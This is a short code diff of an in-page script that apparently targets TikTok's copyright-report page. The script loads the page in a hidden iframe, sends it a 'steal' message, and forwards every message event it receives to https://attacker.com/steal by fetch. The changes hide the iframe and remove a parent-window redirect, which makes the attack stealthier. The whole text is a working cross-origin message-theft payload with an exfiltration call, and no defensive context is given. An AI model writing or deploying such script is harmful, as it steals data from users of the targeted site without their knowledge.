@@ -1,20 +1,17 @@
 <script>
-parent.postMessage({
-    action: "requestRedirectionTo",
-    targetUrlStr: "https://www.tiktok.com/legal/report/Copyright"
-}, "*");
-
+// DO NOT redirect the parent this time
 setTimeout(() => {
     const frame = document.createElement('iframe');
     frame.src = "https://www.tiktok.com/legal/report/Copyright";
+    frame.style.display = "none"; // hide it
     document.body.appendChild(frame);
-
-    frame.onload = () => {
-        frame.contentWindow.postMessage("steal","*");
-    };
 
     window.addEventListener("message", (e) => {
         fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
     });
-}, 2000);
+
+    frame.onload = () => {
+        frame.contentWindow.postMessage("steal","*"); // try to talk to the iframe
+    };
+}, 1000);
 </script>
